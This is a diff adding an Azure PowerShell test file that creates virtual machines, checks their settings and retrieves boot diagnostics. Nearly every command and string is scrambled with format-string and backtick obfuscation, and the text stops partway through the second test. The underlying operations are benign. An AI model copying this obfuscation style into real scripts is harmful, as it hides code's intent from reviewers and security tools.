@@ -1,0 +1,508 @@
+function t`eSt`-Vi`RTu`AlmachiNe`Boo`TDi`AGN`OsTICs
+{
+    
+    ${r`gn`AME} = &("{2}{3}{4}{0}{1}{6}{7}{5}" -f 'Te','stR','Get','-Comp','ute','e','esourceN','am')
+
+    try
+    {
+        
+        ${l`oc} = &("{0}{1}{2}{3}{4}"-f'Get-Co','mp','ut','eVMLocat','ion');
+        &("{2}{4}{3}{1}{0}"-f'up','o','New-AzRe','rceGr','sou') -Name ${R`gNaMe} -Location ${l`oc} -Force;
+
+        
+        ${Vmsi`ZE} = ("{0}{1}{2}"-f 'Stand','ard_A','4');
+        ${VmN`Ame} = 'vm' + ${R`g`NAme};
+        ${p} = &("{1}{2}{3}{0}"-f'ig','Ne','w-AzVMC','onf') -VMName ${v`M`NaMe} -VMSize ${VM`sizE};
+        &("{1}{2}{0}{3}"-f'se','A','s','rt-AreEqual') ${P}."HAr`dwAREPROfI`Le"."v`mSize" ${VMSi`ze};
+
+        
+        ${SUBN`Et} = &("{3}{1}{6}{0}{7}{2}{8}{4}{5}"-f'l','-AzVirtu','S','New','Conf','ig','a','Network','ubnet') -Name (("{0}{1}"-f's','ubnet') + ${rg`NA`me}) -AddressPrefix ("{0}{2}{1}"-f '10.','0.0/24','0.');
+        ${vN`ET} = &("{1}{3}{2}{0}{4}" -f'r','N','w-AzVirtualNetwo','e','k') -Force -Name (("{1}{0}" -f't','vne') + ${Rg`Na`me}) -ResourceGroupName ${rgNa`Me} -Location ${L`OC} -AddressPrefix ("{1}{2}{0}{3}" -f '.0.','10.','0','0/16') -Subnet ${sUBn`eT};
+        ${V`NET} = &("{0}{4}{3}{1}{5}{2}" -f 'Get','lNe','rk','rtua','-AzVi','two') -Name (("{0}{1}" -f 'vne','t') + ${r`gnA`Me}) -ResourceGroupName ${Rg`N`AMe};
+        ${SU`BneT`Id} = ${vN`ET}."SU`B`NEtS"[0]."i`D";
+        ${p`U`BiP} = &("{1}{4}{2}{0}{3}{5}" -f 'Ip','New-A','ic','Addre','zPubl','ss') -Force -Name (("{0}{1}"-f'pub','ip') + ${rgna`me}) -ResourceGroupName ${RGn`AmE} -Location ${l`OC} -AllocationMethod ("{2}{1}{0}" -f 'c','ami','Dyn') -DomainNameLabel (("{0}{1}" -f'p','ubip') + ${rG`N`AME});
+        ${Pu`BiP} = &("{5}{2}{3}{0}{1}{4}"-f 'bl','i','et','-AzPu','cIpAddress','G') -Name (("{0}{1}" -f'pu','bip') + ${Rg`N`AmE}) -ResourceGroupName ${rG`Na`Me};
+        ${puB`i`PiD} = ${PuB`iP}."I`d";
+        ${n`IC} = &("{0}{1}{6}{2}{4}{3}{5}"-f'New-A','z','w','kInte','or','rface','Net') -Force -Name ('nic' + ${RgN`Ame}) -ResourceGroupName ${R`GN`Ame} -Location ${L`oc} -SubnetId ${SubN`E`TiD} -PublicIpAddressId ${P`UB`Ip}."Id";
+        ${n`Ic} = &("{2}{0}{1}{4}{3}"-f '-AzNetwo','r','Get','nterface','kI') -Name ('nic' + ${r`GNAMe}) -ResourceGroupName ${r`gN`AMe};
+        ${N`icID} = ${n`ic}."i`D";
+
+        ${P} = &("{3}{4}{5}{2}{0}{1}" -f'nte','rface','kI','Add-','AzV','MNetwor') -VM ${p} -Id ${nic`iD};
+        &("{0}{3}{2}{1}"-f 'Asser','Equal','e','t-Ar') ${p}."nEtW`orkp`ROf`ile"."NE`T`WOrKiN`T`eRFAC`es"."cO`UNT" 1;
+        &("{1}{2}{3}{0}" -f'l','Assert-Ar','eEqu','a') ${p}."n`ETwoR`KpROfI`LE"."NEtworkI`NTe`RFaC`eS"[0]."Id" ${n`Icid};
+
+        
+        ${P} = &("{1}{4}{7}{2}{0}{5}{3}{6}"-f'k','A','or','nt','dd-AzV','I','erface','MNetw') -VM ${p} -Id ${NiC`Id} -Primary;
+        &("{3}{4}{2}{1}{0}"-f'l','qua','E','A','ssert-Are') ${P}."N`eTw`O`RkPrOfIlE"."NEt`woRKint`eRfA`cEs"."c`Ount" 1;
+        &("{3}{2}{1}{0}" -f 'al','Equ','-Are','Assert') ${p}."n`ETWo`RKPRO`File"."NETWORKInTeRF`A`C`ES"[0]."I`D" ${n`I`ciD};
+        &("{2}{0}{1}" -f'A','reEqual','Assert-') ${p}."N`et`w`ORKproFi`le"."NETw`ORKI`N`TERFA`cEs"[0]."pr`i`mary" ${tr`Ue};
+
+        
+        ${sT`onA`Me} = 'sto' + ${rg`NaMe};
+        ${stO`T`YPe} = ("{0}{2}{3}{1}"-f 'Sta','RS','nd','ard_G');
+        &("{3}{2}{0}{1}{4}" -f'zStorag','eAccoun','-A','New','t') -ResourceGroupName ${R`GN`AME} -Name ${sTona`mE} -Location ${l`oc} -Type ${s`Tot`yPE};
+        ${st`OacC`OU`Nt} = &("{1}{5}{0}{2}{3}{4}{6}"-f'ge','Get-','A','c','c','AzStora','ount') -ResourceGroupName ${r`g`NAME} -Name ${sT`o`NAME};
+
+        ${O`SdI`skn`AME} = ("{1}{0}"-f 'k','osDis');
+        ${os`DiSkCAch`Ing} = ("{2}{0}{1}" -f 'ri','te','ReadW');
+        ${OsD`I`skVhduRI} = "https://$stoname.blob.core.windows.net/test/os.vhd";
+        ${dA`TadI`sKV`hDuRi1} = "https://$stoname.blob.core.windows.net/test/data1.vhd";
+        ${DatA`DISKV`H`Du`Ri2} = "https://$stoname.blob.core.windows.net/test/data2.vhd";
+
+        ${P} = &("{3}{2}{0}{1}{4}" -f '-AzV','MOS','et','S','Disk') -VM ${p} -Name ${O`Sd`IsKna`me} -VhdUri ${OS`DiSkV`hd`U`Ri} -Caching ${o`s`Di`s`KcaCHing} -CreateOption ("{0}{2}{1}" -f 'Fro','age','mIm');
+        ${P} = &("{0}{1}{2}"-f'A','dd-AzVMDataDi','sk') -VM ${P} -Name ("{0}{2}{1}" -f 'te','ataDisk1','stD') -Caching ("{2}{1}{0}"-f 'Only','ad','Re') -DiskSizeInGB 10 -Lun 1 -VhdUri ${d`ATa`dIsKVhDU`RI1} -CreateOption ("{0}{1}" -f'Em','pty');
+        ${P} = &("{3}{1}{2}{0}" -f 'sk','z','VMDataDi','Add-A') -VM ${P} -Name ("{2}{1}{0}" -f 'k2','taDis','testDa') -Caching ("{0}{1}{2}"-f'Rea','d','Only') -DiskSizeInGB 11 -Lun 2 -VhdUri ${dATADIsk`Vh`du`RI2} -CreateOption ("{1}{0}" -f 'ty','Emp');
+
+        &("{0}{2}{3}{1}{4}" -f'A','AreEqu','sse','rt-','al') ${p}."sTORA`gEProF`i`lE"."OS`d`isk"."cAChi`NG" ${Os`dIsk`cA`cHi`Ng};
+        &("{2}{1}{3}{0}"-f 'Equal','rt-','Asse','Are') ${p}."St`o`RAGepro`FilE"."O`SDIsK"."N`AME" ${OSD`iSKnA`ME};
+        &("{0}{4}{2}{3}{1}"-f'As','l','ert-AreEqu','a','s') ${P}."S`Tor`AGEP`ROFILe"."oSdI`SK"."V`hD"."u`RI" ${O`sdISk`VHd`URi};
+        &("{1}{0}{3}{2}{4}" -f's','A','q','sert-AreE','ual') ${p}."S`ToRAGEpRo`FIlE"."d`A`Tad`isks"."c`ounT" 2;
+        &("{3}{0}{2}{1}" -f'se','eEqual','rt-Ar','As') ${P}."stOr`A`gePRo`FILE"."datADI`s`KS"[0]."c`AchING" ("{0}{1}"-f'Rea','dOnly');
+        &("{0}{3}{1}{4}{2}"-f'Asser','-Are','qual','t','E') ${p}."st`Orag`EPR`O`FIlE"."DA`TAD`iskS"[0]."Dis`KSi`z`EGb" 10;
+        &("{0}{2}{3}{1}"-f'Assert-','ual','AreE','q') ${P}."STOra`GeP`ROFiLE"."DA`TAdISKS"[0]."L`Un" 1;
+        &("{2}{3}{0}{1}" -f'rt-Ar','eEqual','Ass','e') ${p}."sToR`A`GEpro`FIle"."DA`TaD`ISks"[0]."v`HD"."U`RI" ${D`Ata`dIsKVh`du`RI1};
+        &("{0}{1}{2}{3}{4}" -f 'Asser','t-','Are','Equa','l') ${P}."s`TOra`gepr`OF`Ile"."daT`A`DIskS"[1]."c`AC`HinG" ("{1}{2}{0}" -f'dOnly','R','ea');
+        &("{0}{3}{4}{1}{2}"-f'As','eE','qual','s','ert-Ar') ${P}."stoRaG`E`PRof`IlE"."daTA`di`SKS"[1]."Disk`sIz`Egb" 11;
+        &("{4}{2}{1}{3}{0}"-f'l','Eq','t-Are','ua','Asser') ${P}."STO`RagePr`o`FILE"."d`ATAdI`Sks"[1]."L`UN" 2;
+        &("{2}{3}{0}{1}"-f 'A','reEqual','Asse','rt-') ${p}."ST`O`RA`g`EproFiLE"."Da`TAD`IsKS"[1]."v`hD"."U`Ri" ${d`ATAD`iskVH`duR`I2};
+
+        
+        ${US`er} = ("{0}{1}" -f 'F','oo12');
+        ${P`Ass`woRd} = ${PLA`c`EhO`LdEr};
+        ${Se`CuREP`A`Sswo`Rd} = &("{6}{2}{1}{3}{0}{4}{5}" -f'c','ertTo-S','onv','e','ureStr','ing','C') ${pasSWo`RD} -AsPlainText -Force;
+        ${Cr`ed} = &("{0}{1}{2}" -f'Ne','w-Objec','t') ("{6}{2}{10}{8}{11}{1}{12}{0}{3}{5}{4}{7}{9}"-f 't.','me','s','Au','n.','tomatio','Sy','PSCrede','g','ntial','tem.Mana','e','n') (${U`sEr}, ${sECURepA`ss`w`ORd});
+        ${CoMp`UT`ErnaME} = ("{0}{1}"-f't','est');
+        ${v`HDCon`T`AIneR} = "https://$stoname.blob.core.windows.net/test";
+
+        ${p} = &("{5}{2}{0}{4}{3}{1}"-f'e','m','et-AzVMOp','ste','ratingSy','S') -VM ${p} -Windows -ComputerName ${CoMPuT`eR`N`AMe} -Credential ${c`RED};
+
+        ${I`M`gReF} = &("{0}{3}{4}{1}{5}{2}"-f'Get-D','ma','e','e','faultCRPI','g') -loc ${L`oc};
+        ${P} = (${I`mGR`Ef} | &("{1}{2}{0}{3}{4}" -f 'urc','Set-Az','VMSo','e','Image') -VM ${P});
+
+        &("{3}{0}{1}{2}" -f 't-Ar','eE','qual','Asser') ${p}."osPRo`FilE"."admINuSEr`N`AME" ${U`SeR};
+        &("{0}{1}{3}{2}"-f'Assert-A','r','ual','eEq') ${P}."o`s`PrOFI`Le"."COmp`U`TeRn`Ame" ${c`ompUT`e`RnamE};
+        &("{1}{0}{2}"-f'AreEqu','Assert-','al') ${p}."OSPROf`I`LE"."a`dmIn`PASsW`Ord" ${Pa`S`swO`RD};
+
+        &("{0}{3}{2}{1}"-f 'A','l','t-AreEqua','sser') ${P}."s`T`OR`AGEp`RofILe"."Im`AGErEFe`RENCe"."of`Fer" ${IM`GR`ef}."of`FEr";
+        &("{0}{3}{2}{1}"-f 'As','-AreEqual','t','ser') ${P}."STor`AGE`p`Rof`iLe"."iM`A`GeRe`F`ErencE"."p`UblIs`HER" ${ImG`R`EF}."pU`BlisH`eRnA`mE";
+        &("{2}{1}{0}"-f 'l','a','Assert-AreEqu') ${p}."s`TORAge`pr`Ofi`le"."i`MAg`eR`EFeRenCe"."s`kU" ${im`GR`eF}."SK`Us";
+        &("{0}{1}{2}" -f'Assert-AreE','qu','al') ${p}."S`TORagEpr`o`FilE"."ImAg`E`REF`eRe`NCe"."vER`sION" ${im`GREF}."ver`sI`On";
+
+        
+        &("{1}{0}"-f 'M','New-AzV') -ResourceGroupName ${R`GN`Ame} -Location ${L`Oc} -VM ${p};
+
+        
+        ${V`M1} = &("{2}{1}{0}" -f'AzVM','et-','G') -Name ${vMN`A`Me} -ResourceGroupName ${rgn`AMe};
+        &("{1}{3}{0}{2}" -f 'qu','Assert-','al','AreE') ${V`M1}."N`AmE" ${vMna`ME};
+        &("{3}{0}{1}{2}"-f 'se','rt-Ar','eEqual','As') ${v`M1}."N`E`TwO`RKprOFILe"."N`etwOrkIn`TeR`Fa`cES"."C`oUNt" 1;
+        &("{0}{3}{4}{2}{1}"-f'As','eEqual','Ar','ser','t-') ${V`m1}."N`EtWoR`KprOfilE"."NETWo`RKIntE`R`FaC`eS"[0]."ID" ${nI`cId};
+
+        &("{4}{1}{3}{2}{0}" -f 'Equal','t-','e','Ar','Asser') ${V`m1}."s`To`RA`GepRoFILe"."IMag`E`REfErEn`Ce"."off`er" ${I`M`gREF}."oFf`ER";
+        &("{0}{1}{2}"-f'As','sert-AreEqu','al') ${v`m1}."SToR`AgEProfi`Le"."iMageR`EFE`RE`NCe"."P`UbL`isHeR" ${Img`REf}."p`Ublis`HeR`NAme";
+        &("{0}{3}{2}{1}" -f 'As','qual','-AreE','sert') ${v`M1}."StoRAG`E`p`RofiLe"."im`AGERE`FEre`NCe"."S`ku" ${i`M`GReF}."S`KUS";
+        &("{2}{0}{3}{1}" -f're','l','Assert-A','Equa') ${V`M1}."stO`R`AgEP`RoF`ILE"."iMA`gEreFerE`NCe"."VErs`ION" ${imgR`EF}."VE`RSioN";
+
+        &("{4}{1}{3}{2}{0}" -f'ual','e','q','E','Assert-Ar') ${v`m1}."OsPrOF`iLe"."AdMI`Nu`serN`AMe" ${U`Ser};
+        &("{1}{2}{0}{3}"-f'E','Ass','ert-Are','qual') ${V`M1}."oSP`ROfiLE"."cOm`PUte`RNaMe" ${CoM`Pu`T`ErNamE};
+        &("{3}{1}{2}{0}" -f 'al','q','u','Assert-AreE') ${V`m1}."HarD`W`ArEpR`OFile"."V`msI`zE" ${Vms`IZE};
+
+        &("{1}{3}{0}{2}{4}"-f'sert-','A','A','s','reEqual') ${T`Rue} ${v`m1}."dI`A`Gn`oS`TicsProF`Ile"."b`o`oTDiAG`NO`STICS"."ENaB`Led";
+        &("{2}{3}{0}{1}" -f'reE','qual','As','sert-A') ${S`ToAC`C`oUNt}."pr`IMa`RYEnDp`o`intS"."b`LOB" ${v`M1}."di`Agno`stIC`sprofI`lE"."bOOTDi`AGno`SticS"."STOrAGE`U`RI";
+
+        &("{1}{2}{0}{3}"-f'o','Wait-S','ec','nds') 600;
+        ${LocaLp`A`TH} = (&("{2}{0}{1}"-f'te','m','Get-I') -Path ".\" -Verbose)."F`Ulln`AMe"
+        &("{4}{1}{0}{2}{3}"-f 'osti','t-AzVMBootDiagn','c','sData','Ge') -Windows -ResourceGroupName ${RG`NAmE} -Name ${vMn`AMe} -LocalPath ${lOC`AL`PaTH};
+
+        
+        &("{2}{1}{0}" -f'-AzVM','emove','R') -Name ${VM`N`AME} -ResourceGroupName ${R`Gn`AME} -Force;
+
+        
+        ${osDI`S`kVhdurI} = "https://$stoname.blob.core.windows.net/test/linuxos.vhd";
+        ${OSDIS`k`NamE} = ("{2}{3}{1}{0}" -f'sDisk','O','l','inux');
+
+        ${P} = &("{0}{4}{2}{3}{1}"-f'Ne','MConfig','-','AzV','w') -VMName ${vMn`AMe} -VMSize ${v`msizE};
+        ${p} = &("{0}{3}{4}{1}{5}{2}{6}" -f'Add-Az','e','fa','VM','N','tworkInter','ce') -VM ${p} -Id ${n`ic`iD};
+        ${P} = &("{2}{1}{0}{3}" -f'zV','t-A','Se','MOSDisk') -VM ${p} -Name ${OsDiSK`N`AMe} -VhdUri ${OSdISkvHD`U`RI} -Caching ${OS`Di`Sk`CaCHing} -CreateOption ("{2}{0}{1}" -f'om','Image','Fr');
+
+        ${Img`ReF} = &("{4}{6}{2}{5}{0}{1}{3}" -f'RPL','inuxIm','e','ageOffline','Ge','faultC','t-D');
+        ${P} = &("{5}{4}{1}{6}{2}{3}{0}"-f 'tem','-AzVMOp','ingSy','s','et','S','erat') -VM ${p} -Linux -ComputerName ${c`o`mPutER`NAMe} -Credential ${CR`ED}
+        ${P} = (${I`m`GreF} | &("{3}{0}{5}{2}{1}{4}"-f't-Az','SourceI','M','Se','mage','V') -VM ${p});
+
+        
+        &("{0}{1}{2}"-f 'New-','A','zVM') -ResourceGroupName ${r`g`NamE} -Location ${L`Oc} -VM ${P};
+
+        
+        ${V`M1} = &("{1}{0}{2}"-f 'Az','Get-','VM') -Name ${V`Mn`AME} -ResourceGroupName ${RgN`Ame};
+        &("{0}{2}{1}"-f'Asser','qual','t-AreE') ${V`M1}."n`AME" ${v`mN`AmE};
+        &("{0}{3}{1}{2}" -f 'Asser','Ar','eEqual','t-') ${v`M1}."nETW`Or`kPr`oFIle"."n`EtwOr`KIn`TeRfaces"."Co`UNt" 1;
+        &("{2}{3}{0}{1}"-f'u','al','Asse','rt-AreEq') ${V`M1}."n`ETwo`RKpROf`I`le"."NEtWor`k`IN`TERfA`cES"[0]."i`D" ${NI`C`id};
+
+        &("{3}{0}{4}{2}{1}"-f 't','l','ua','Asser','-AreEq') ${V`M1}."sT`orag`ePr`oFile"."IMaGeR`e`FeR`EnCe"."of`FER" ${IM`Gr`EF}."o`FFer";
+        &("{2}{1}{3}{0}"-f'Equal','e','Ass','rt-Are') ${v`m1}."S`TOR`Age`profI`le"."im`AgeRE`FeR`eN`ce"."pU`BLIS`her" ${imGr`eF}."pU`BlI`ShE`RN`Ame";
+        &("{3}{2}{1}{0}"-f'-AreEqual','t','ser','As') ${V`M1}."StoRA`GepRo`FILE"."I`mA`GErEFer`eNCe"."S`ku" ${IM`Gr`EF}."sK`Us";
+        &("{1}{0}{2}"-f'rt-AreEq','Asse','ual') ${v`m1}."S`TOr`AGe`ProFi`LE"."iM`AGeR`eF`E`RENce"."v`ERsiON" ${i`m`GrEf}."veRS`I`oN";
+
+        &("{0}{1}{2}{3}" -f'As','ser','t-Ar','eEqual') ${V`m1}."os`pRof`ILe"."A`D`M`inuSeR`NamE" ${U`SEr};
+        &("{2}{1}{0}"-f'Equal','e','Assert-Ar') ${v`M1}."ospr`O`FILE"."coMput`e`RnA`Me" ${c`OmP`U`TERNAmE};
+        &("{1}{2}{0}{3}" -f 'ua','As','sert-AreEq','l') ${V`M1}."harD`WARePr`ofIlE"."v`MSi`ze" ${vm`SizE};
+
+        &("{4}{2}{1}{0}{3}" -f 'AreE','-','rt','qual','Asse') ${T`RUE} ${V`m1}."Di`AGnos`TIcSPr`oFi`le"."Bo`oTDiAg`NO`S`TIcS"."En`AbLeD";
+        &("{0}{2}{3}{1}"-f'A','eEqual','ss','ert-Ar') ${s`T`oa`ccoUNT}."p`RImARy`En`DpOINts"."bL`Ob" ${V`M1}."dI`AgNOs`TiCs`prOfIlE"."BoO`TDiAGNOSt`ics"."sToR`Ag`EU`RI";
+
+        &("{3}{0}{1}{2}"-f'-','S','econds','Wait') 600;
+
+        ${B`DdA`Ta} = &("{2}{0}{1}{6}{3}{4}{5}"-f 'AzVMBoo','t','Get-','iagnosticsD','a','ta','D') -Linux -ResourceGroupName ${rG`NamE} -Name ${v`mNaME} | &("{3}{0}{1}{2}"-f'tri','n','g','Out-S');
+
+        &("{2}{0}{1}"-f'tp','ut','Write-Ou')(("{2}{1}{4}{3}{0}" -f 'ta:','i','BootD','ticsDa','agnos'));
+        &("{0}{2}{1}{3}" -f 'W','i','r','te-Output')(${bDDA`Ta});
+    }
+    finally
+    {
+        
+        &("{1}{2}{3}{0}{4}"-f 'ourceG','Clean','-R','es','roup') ${R`gNa`mE}
+    }
+}
+
+
+function T`Es`T-`VIRtUAlMaCh`INe`BOOTD`iagNo`sti`cspRe`MIUm
+{
+    
+    ${r`gn`Ame} = &("{3}{1}{0}{2}{4}"-f 'omputeT','t-C','estResourceNa','Ge','me')
+
+    try
+    {
+        
+        ${l`OC} = &("{0}{2}{3}{1}" -f'Get-','cation','Comp','uteVMLo');
+        &("{0}{6}{4}{1}{5}{3}{2}"-f'Ne','e','up','ro','AzR','sourceG','w-') -Name ${Rg`NAME} -Location ${l`Oc} -Force;
+
+        
+        ${VmS`I`ZE} = ("{1}{0}{2}" -f 'tanda','S','rd_DS1');
+        ${VMn`A`ME} = 'vm' + ${r`GN`AME};
+        ${P} = &("{3}{1}{0}{2}"-f'onf','MC','ig','New-AzV') -VMName ${v`Mn`Ame} -VMSize ${v`mS`izE};
+        &("{2}{0}{3}{1}"-f 't-','reEqual','Asser','A') ${p}."HaRD`WA`R`ePROFi`Le"."v`mSIZe" ${V`msi`ze};
+
+        
+        ${s`UBn`Et} = &("{5}{1}{0}{2}{3}{4}" -f'irtua','ew-AzV','lNetworkSub','netC','onfig','N') -Name (("{0}{1}{2}" -f 's','u','bnet') + ${r`Gna`ME}) -AddressPrefix ("{0}{1}{2}{3}"-f'10.','0','.0.','0/24');
+        ${Vn`et} = &("{3}{2}{4}{1}{0}" -f 'twork','tualNe','w-','Ne','AzVir') -Force -Name (("{1}{0}" -f'et','vn') + ${r`GNAmE}) -ResourceGroupName ${R`GnAmE} -Location ${L`oc} -AddressPrefix ("{1}{2}{0}"-f '0.0/16','10.','0.') -Subnet ${Sub`NET};
+        ${v`NeT} = &("{3}{1}{2}{0}"-f'twork','ual','Ne','Get-AzVirt') -Name (("{1}{0}" -f 'et','vn') + ${rgNa`me}) -ResourceGroupName ${rgN`A`mE};
+        ${s`UbnEt`id} = ${V`Net}."subn`e`Ts"[0]."Id";
+        ${p`UBiP} = &("{2}{3}{4}{0}{1}" -f'pAddr','ess','New-A','z','PublicI') -Force -Name (("{0}{1}" -f 'pubi','p') + ${rgn`AME}) -ResourceGroupName ${Rgn`AMe} -Location ${L`OC} -AllocationMethod ("{1}{0}{2}" -f 'nami','Dy','c') -DomainNameLabel (("{1}{0}"-f 'p','pubi') + ${rGnA`me});
+        ${PUb`IP} = &("{0}{4}{2}{1}{5}{3}{6}"-f 'G','u','AzP','cIp','et-','bli','Address') -Name (("{0}{1}"-f'p','ubip') + ${RGN`A`Me}) -ResourceGroupName ${r`Gn`Ame};
+        ${Pu`BI`piD} = ${PU`B`ip}."iD";
+        ${N`IC} = &("{3}{1}{5}{0}{2}{4}{6}"-f 'rkIn','ew-AzNet','t','N','e','wo','rface') -Force -Name ('nic' + ${RgNa`Me}) -ResourceGroupName ${R`g`NAME} -Location ${l`Oc} -SubnetId ${sUb`NE`TId} -PublicIpAddressId ${pUB`iP}."i`D";
+        ${N`IC} = &("{2}{1}{4}{3}{0}" -f 'orkInterface','et-','G','Netw','Az') -Name ('nic' + ${r`Gn`AME}) -ResourceGroupName ${RgN`A`me};
+        ${N`iCID} = ${N`IC}."I`D";
+
+        ${p} = &("{4}{0}{2}{1}{3}"-f'zVMNetworkI','terf','n','ace','Add-A') -VM ${p} -Id ${NiC`iD};
+        &("{1}{0}{2}{3}" -f 'rt-Ar','Asse','eEq','ual') ${P}."NEtw`oRk`pRoFILE"."ne`T`W`ORKiNTerF`ACEs"."C`OunT" 1;
+        &("{2}{3}{1}{4}{0}" -f'ual','sert-Ar','A','s','eEq') ${P}."nE`TWorkpRo`FilE"."networ`K`In`Ter`FAcEs"[0]."i`d" ${N`iCID};
+
+        
+        ${P} = &("{0}{5}{1}{3}{2}{4}" -f'Add-AzVMN','kIn','rfa','te','ce','etwor') -VM ${p} -Id ${N`iCId} -Primary;
+        &("{2}{0}{1}" -f'sert-AreEqua','l','As') ${p}."N`EtwOrKPr`ofILE"."netWOR`kInt`ER`FacEs"."cou`Nt" 1;
+        &("{3}{2}{1}{0}"-f 'AreEqual','ert-','ss','A') ${p}."N`eTWORKPRO`FiLe"."NEt`woRki`NTE`Rf`A`ces"[0]."I`d" ${N`ic`ID};
+        &("{1}{0}{2}" -f'e','Assert-Ar','Equal') ${P}."nET`wOrkPR`o`FilE"."n`eTWORk`INTErf`A`CES"[0]."PR`Ima`RY" ${tR`Ue};
+
+        
+        ${s`ToNa`mE} = 'sto' + ${r`gNA`Me};
+        ${s`TOT`YpE} = ("{1}{0}{3}{2}" -f'miu','Pre','_LRS','m');
+        &("{2}{5}{0}{4}{6}{3}{1}" -f'Az','nt','N','Accou','Stor','ew-','age') -ResourceGroupName ${rg`NAMe} -Name ${S`TOn`AmE} -Location ${l`Oc} -Type ${St`OTY`Pe};
+        ${stoa`cCou`Nt} = &("{1}{0}{3}{4}{2}{5}"-f 'et-A','G','geAccou','zSt','ora','nt') -ResourceGroupName ${r`gName} -Name ${s`ToNa`mE};
+
+        ${oSDiS`KN`AmE} = ("{2}{1}{0}" -f 'isk','D','os');
+        ${oSdIsK`cACHI`Ng} = ("{0}{1}" -f'N','one');
+        ${OSDis`kvh`DUrI} = "https://$stoname.blob.core.windows.net/test/os.vhd";
+
+        ${p} = &("{0}{3}{1}{2}"-f'Set-Az','SDis','k','VMO') -VM ${p} -Name ${o`S`d`isKNaMe} -VhdUri ${osDiSk`VHDU`Ri} -Caching ${OsDisKCaCh`I`NG} -CreateOption ("{2}{0}{1}"-f 'g','e','FromIma');
+
+        &("{0}{2}{3}{1}"-f 'A','eEqual','sser','t-Ar') ${p}."StoRAg`E`PRofILe"."OSD`i`Sk"."c`Aching" ${OS`d`IskCAcHINg};
+        &("{1}{2}{3}{0}{4}"-f'r','As','se','rt-A','eEqual') ${P}."ST`oR`AGepRof`i`Le"."osD`Isk"."n`AMe" ${osD`IS`kNamE};
+        &("{2}{3}{1}{0}"-f 'al','rt-AreEqu','Ass','e') ${p}."stO`RaGEP`ROfi`lE"."o`SdISK"."V`hD"."U`RI" ${osDI`SKvh`DUri};
+
+        
+        ${US`eR} = ("{0}{1}"-f'Fo','o12');
+        ${p`A`SSWORD} = ${p`la`C`EHoLDER};
+        ${s`EcUR`ePAs`sWorD} = &("{5}{1}{4}{0}{2}{3}" -f 'u','o','reStr','ing','nvertTo-Sec','C') ${paSs`w`OrD} -AsPlainText -Force;
+        ${c`Red} = &("{1}{2}{0}" -f 'ct','New-Obj','e') ("{0}{5}{4}{9}{2}{3}{10}{8}{6}{1}{7}"-f'Syst','ion.P','em','ent','.M','em','t','SCredential','ma','anag','.Auto') (${u`sEr}, ${SEc`URepA`SS`W`Ord});
+        ${Co`m`P`UTerna`me} = ("{1}{0}" -f 't','tes');
+        ${vHdc`ONTAI`NeR} = "https://$stoname.blob.core.windows.net/test";
+
+        ${P} = &("{2}{1}{3}{0}"-f'ystem','et-A','S','zVMOperatingS') -VM ${P} -Windows -ComputerName ${c`oMPu`TErName} -Credential ${Cr`Ed};
+
+        ${I`mgREf} = &("{5}{0}{4}{3}{2}{1}" -f '-De','e','tCRPImag','l','fau','Get') -loc ${L`OC};
+        ${P} = (${iMG`R`eF} | &("{3}{2}{4}{0}{1}{5}"-f 'rceI','mag','VMS','Set-Az','ou','e') -VM ${p});
+
+        &("{4}{0}{3}{1}{2}"-f 'sert-','qu','al','AreE','As') ${p}."o`Sp`R`ofIle"."AdMI`NUseRNA`Me" ${u`sEr};
+        &("{3}{0}{2}{1}" -f 'rt-','Equal','Are','Asse') ${p}."OSPrOfI`le"."cOMPut`ERN`AME" ${CO`mpuTeR`NaMe};
+        &("{0}{1}{3}{2}" -f 'Asse','r','eEqual','t-Ar') ${P}."o`SPr`OfIlE"."adMiN`pA`SsW`ord" ${Pa`S`sWoRd};
+
+        &("{2}{3}{1}{4}{0}" -f'l','reEq','Assert','-A','ua') ${p}."S`T`OrAgEprOF`I`le"."imAgeref`eR`En`Ce"."OF`FeR" ${iM`G`REf}."O`Ffer";
+        &("{3}{4}{0}{1}{2}"-f'e','E','qual','Asse','rt-Ar') ${P}."sTO`RAG`EpR`of`ilE"."I`M`AgE`Ref`Erence"."PUBL`iS`h`er" ${I`mgReF}."PUb`l`is`hErNAMe";
+        &("{2}{3}{0}{1}"-f'q','ual','Ass','ert-AreE') ${p}."ST`OraG`epRo`FiLE"."im`AG`E`RefEr`Ence"."S`ku" ${IMg`R`ef}."sk`US";
+        &("{3}{1}{0}{2}"-f 'AreEqua','ssert-','l','A') ${P}."Sto`RagE`prOF`ile"."iM`AGErE`FE`RE`NCE"."versi`ON" ${ImG`REf}."verSi`On";
+
+        
+        &("{2}{0}{1}" -f 'w','-AzVM','Ne') -ResourceGroupName ${Rg`N`AMe} -Location ${L`oc} -VM ${p};
+
+        
+        ${V`M1} = &("{0}{1}{2}" -f'Get-A','zV','M') -Name ${V`mN`AME} -ResourceGroupName ${r`GN`Ame};
+        &("{1}{3}{0}{2}" -f '-AreEqu','Ass','al','ert') ${v`M1}."nA`Me" ${vMn`AmE};
+        &("{0}{2}{1}{3}" -f'Asser','u','t-AreEq','al') ${V`M1}."NetW`OR`kP`ROfILe"."N`E`TwOrkInt`ErfACes"."C`ouNt" 1;
+        &("{0}{3}{1}{2}" -f'A','Eq','ual','ssert-Are') ${V`m1}."nEt`WOrK`prOFIlE"."NETWor`K`iNTe`RfaceS"[0]."id" ${n`ICid};
+
+        &("{1}{0}{2}{3}" -f'sert-Ar','As','eEqua','l') ${V`M1}."St`Or`AGe`pR`OFile"."IMAg`e`REferEnCE"."ofF`Er" ${img`REf}."oFF`ER";
+        &("{0}{3}{2}{1}"-f 'A','al','eEqu','ssert-Ar') ${V`M1}."S`TOR`AGEPR`ofile"."I`ma`gEre`FEReN`cE"."pUb`lI`s`HER" ${IM`GReF}."P`UBl`i`SHErnAME";
+        &("{0}{2}{1}{3}" -f 'A','a','ssert-AreEqu','l') ${v`M1}."storAgepro`F`ILe"."i`maGErE`F`ErE`NCE"."s`kU" ${im`G`ReF}."sK`Us";
+        &("{2}{3}{0}{1}" -f'r','t-AreEqual','As','se') ${V`m1}."STO`R`AgEprOf`ILe"."IMA`GerE`FEr`e`NCe"."V`ERS`Ion" ${imGR`Ef}."VER`SIoN";
+
+        &("{0}{3}{2}{1}" -f'Asser','qual','reE','t-A') ${V`M1}."OspR`O`FILe"."aD`miN`USeRn`AmE" ${U`SeR};
+        &("{2}{3}{0}{1}" -f 'q','ual','Assert-Ar','eE') ${v`M1}."O`s`PRofiLe"."COMpU`T`Er`NAME" ${comPuTe`R`N`Ame};
+        &("{0}{3}{1}{2}" -f 'Asser','Are','Equal','t-') ${v`m1}."haRdwa`RE`p`RoFI`Le"."v`M`sIze" ${vM`s`iZE};
+
